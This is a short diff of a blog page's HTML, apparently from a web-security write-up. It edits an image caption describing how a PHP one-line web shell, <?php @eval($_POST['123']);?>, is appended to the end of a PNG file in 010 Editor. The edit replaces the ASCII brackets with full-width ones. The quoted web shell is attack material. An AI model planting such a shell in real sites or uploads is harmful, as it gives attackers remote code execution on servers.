@@ -2177,7 +2177,7 @@
 <div class="post-img-view">
     <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331843.png">
         <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165331843.png" 
-             alt="010 Editor 里 muma.png 末尾追加 &lt;?php @eval($_POST[&#39;123&#39;]);?&gt;（红框）" 
+             alt="010 Editor 里 muma.png 末尾追加 &lt;?php @eval($_POST［&#39;123&#39;］);?&gt;（红框）" 
               
              loading="lazy"
         />
